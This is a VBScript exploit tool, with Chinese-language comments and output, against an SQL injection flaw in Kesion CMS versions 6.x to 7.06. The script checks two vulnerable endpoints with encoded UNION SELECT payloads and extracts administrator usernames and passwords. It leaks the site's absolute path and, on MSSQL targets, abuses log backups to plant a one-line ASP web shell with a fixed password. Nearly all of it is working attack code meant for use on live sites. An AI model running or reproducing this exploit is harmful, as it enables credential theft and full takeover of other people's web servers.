'*=========================================================================
'* Intro	科讯kesion 6.x – 7.06 SQL 注射漏洞VBS版利用工具第二版
'* Usage	在命令提示符下输入：Cscript.exe Exp.vbs Www.T00ls.Net
'* By		T00ls 鬼哥
'*=========================================================================

Function PostData(PostUrl)
'WScript.Echo PostUrl
    Dim Http
    Set Http = CreateObject("msxml2.serverXMLHTTP")
    With Http
        .Open "GET", PostUrl, False
        .Send()
        PostData = .ResponseText
    End With
    Set Http = Nothing
    Wscript.Sleep 2000
End Function

Function BackDB(PostUrl)
    Dim Http
    Set Http = CreateObject("msxml2.serverXMLHTTP")
    With Http
        .Open "GET", PostUrl, False
        .Send()
        WScript.Echo "[ " & .Status & " " & .statusText & " ] " & Unescape(Unescape(PostUrl))
        If .Status<>200 Then
            WScript.Echo "日志差异备份出错！"
            WScript.Quit
        End If
    End With
    Set Http = Nothing
    Wscript.Sleep 2000
End Function

Function IsSuccess(PostUrl, strSign)
    strData = PostData(PostUrl)
    'Wscript.Echo strData
    if InStr(strData, strSign) >0 then
        IsSuccess = True
    Else
        IsSuccess = False
    End If
End Function

Function Encode(strData)
    Dim strTemp, I
    For I = 1 To Len(strData)
        strTemp = strTemp & "%25" & Hex(Asc(Mid(strData, I, 1)))
    Next
    Encode = strTemp & "%2500"
End Function

Function getData(strData, patrn)
    dim strTemp 
    Set re = New RegExp
    re.Pattern = patrn
    re.IgnoreCase = True
    re.Global = True
    Set Matches = re.Execute(strData)
    For i = 0 To Matches.Count - 1
        If Matches(i).Value<>"" Then
            strTemp = strTemp & vbCrLf & Matches(i).SubMatches(0)
        End If
    Next
    getData = strTemp
End Function


Function GetStr(TmpBody,Str1,Str2,strrrr,strrrr2)
if instr(TmpBody,Str1)>0 and instr(TmpBody,Str2)>0 then
Dim TmpStr
if strrrr="" then 
strrrr=0
end if
if strrrr2="" then 
strrrr2=0
end if
BStr=Instr(TmpBody,Str1)
EStr=Instr(BStr+1,TmpBody,Str2)
TmpStr=Mid(TmpBody,Bstr+Len(Str1) + strrrr ,EStr-BStr-Len(Str1) + strrrr2)
GetStr=TmpStr
else
GetStr=TmpBody
end if
End Function

If WScript.Arguments.Count <> 1 Then
    WScript.Echo "* ================================================================"
    WScript.Echo "* Intro	科讯kesion 6.x – 7.06 SQL 注射漏洞VBS版利用工具第二版"
    WScript.Echo "* By		T00ls 鬼哥"
    WScript.Echo "* Usage: 	Cscript.exe Exp.vbs 要检测的网址"
    WScript.Echo "* Example: 	Cscript.exe Exp.vbs http://www.qy9198.com/"
    WScript.Echo "* ================================================================"
    WScript.Quit
End If
attackUrl = WScript.Arguments(0)
attackUrl = Replace(attackUrl,"\","/")
If Right(attackUrl , 1) <> "/" Then
        attackUrl = attackUrl & "/"
End If

strHoleUrl = attackUrl & "user/reg/regajax.asp?action=getcityoption&province="
strTestUrl = strHoleUrl & Encode("' union Select 1, 'ExistHole' From KS_Admin")
WScript.Echo "正在检测是否存在漏洞...."
If IsSuccess(strTestUrl, "ExistHole") Then
    WScript.Echo "恭喜！存在漏洞1"
	bAsql = 1
Else

	strHoleUrl = attackUrl & "plus/Ajaxs.asp?action=GetRelativeItem&Key=goingta%2525%2527%2529%2520"
	strTestUrl = strHoleUrl & Encode(" union Select 1,2, 'ExistHole' From KS_Admin")
	If IsSuccess(strTestUrl, "ExistHole") Then
    	WScript.Echo "恭喜！存在漏洞2" 
	bAsql = 2
	Else
    	WScript.Echo "没有检测到漏洞"
	bAsql = 0
    	WScript.Quit
	end if
End If

if bAsql = 2 then
strTestUrl = strHoleUrl & Encode(" union Select 1,2, 'ExistHole'")
else
strTestUrl = strHoleUrl & Encode("' union Select 1, 'ExistHole'")
end if
WScript.Echo "正在检测是数据库类型...."
If IsSuccess(strTestUrl, "ExistHole") Then
    WScript.Echo "数据库为：MSSQL" 
    bAccess = False
Else
    WScript.Echo "数据库为：ACCESS"
    bAccess = True
End If
WScript.Echo "正在获取管理帐号密码...."
if bAsql = 2 then
strTestUrl = strHoleUrl & Encode(" union Select top 10 AdminID,AdminID,UserName+'|'+PassWord From KS_Admin")
else
strTestUrl = strHoleUrl & Encode("' union Select top 10 AdminID,UserName+'|'+PassWord From KS_Admin")
end if

WScript.Echo "用户名|密码：" &GetStr(PostData(strTestUrl),">","<",0,0)

WScript.Echo "正在获取网站绝对路径...."
strTestUrl = strHoleUrl & "%25i"
strWebPath =  GetStr(PostData(strTestUrl),">","../",0,0)
strWebPath = mid(strWebPath,InstrRev(strWebPath,">")+1,len(strWebPath))
strWebPath = Replace(strWebPath, vbCrLf, "")
    WScript.Echo "网站绝对路径：" & strWebPath 
If Not bAccess Then
if bAsql = 2 then
    strTestUrl = strHoleUrl & Encode("' union Select 1,2, db_name()")
else
     strTestUrl = strHoleUrl & Encode("' union Select 1, db_name()")
end if
    strDatabase = getData(PostData(strTestUrl), "value=""([^""]+)")
    strDatabase = Replace(strDatabase, vbCrLf, "")
    WScript.Echo "MSSQL数据库名为：" & strDatabase

WScript.Echo "正在进行数据库差异备份...."
If strWebPath <> "" And strDatabase <> "" Then
    BackDB(strHoleUrl & Encode("';alter database " & strDatabase & " set RECOVERY FULL"))
    BackDB(strHoleUrl & Encode("';create table cmd (a image)"))
    BackDB(strHoleUrl & Encode("';backup log " & strDatabase & " to disk = 'c:\cmd' with init"))
    BackDB(strHoleUrl & Encode("';insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E)"))
    BackDB(strHoleUrl & Encode("';backup log " & strDatabase & " to disk = '" & strWebPath & "0.asp'"))
    BackDB(strHoleUrl & Encode("';drop table cmd"))
    BackDB(strHoleUrl & Encode("';alter database "& strDatabase & " set RECOVERY SIMPLE"))
End If
WScript.Echo "Execute一句话木马绝对路径为：" & strWebPath & "0.asp"
WScript.Echo "密码为：a"

End If
WScript.Echo "完毕！！"